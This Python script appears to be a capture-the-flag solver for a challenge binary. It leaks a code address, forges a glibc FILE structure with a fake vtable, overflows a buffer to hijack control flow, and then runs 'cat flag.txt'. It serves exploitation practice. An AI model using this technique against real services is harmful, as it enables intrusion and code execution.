from ptrlib import *
import os

HOST = os.getenv("HOST", "0.0.0.0")
PORT = os.getenv("PORT", "9003")

elf = ELF("../distfiles/chall")

for i in range(3):
    sock = Socket(HOST, int(PORT))

    addr_win = int(sock.recvregex("0x[0-9a-f]+"), 16)
    proc_base = addr_win - 0xa5a
    logger.info("proc = " + hex(proc_base))

    addr_fakelock = proc_base + 0x202060 + 0x800
    addr_fakefile = proc_base + 0x202060
    addr_fakevtable = proc_base + 0x202060 + 0xe0
    payload = flat([
        0xfbad1800, 0,     # _flags / _IO_read_ptr
        0, 0,              # _IO_read_end / _IO_read_base
        0, 0,              # _IO_write_base / _IO_write_ptr
        0, 0,              # _IO_write_end / _IO_buf_base
        0, 0,              # _IO_buf_end / _IO_save_base
        0, 0,              # _IO_backup_base / _IO_save_end
        0, 0,              # _markers / _chain
        0, 0,              # _fileno / _flags2 / _old_offset
        0, addr_fakelock,  # _cur_column / _vtable_offset / _shortbuf / _lock
        0, 0,              # _offset / _codecvt
        0, 0,              # _wide_data / _freeres_list
        0, 0,              # _freeres_buf / __pad5 / _mode
        0, 0,              # _unused
        0, addr_fakevtable # _unused / vtable
    ], map=p64)
    payload += p64(addr_win) * 10
    payload += b'A' * (0x200 - len(payload))
    payload += p64(addr_fakefile)
    sock.sendline(payload)
    sock.recvuntil("Congratulations!\n")
    sock.sendline("cat flag.txt")
    print(sock.recvuntil("}"))

    sock.close()
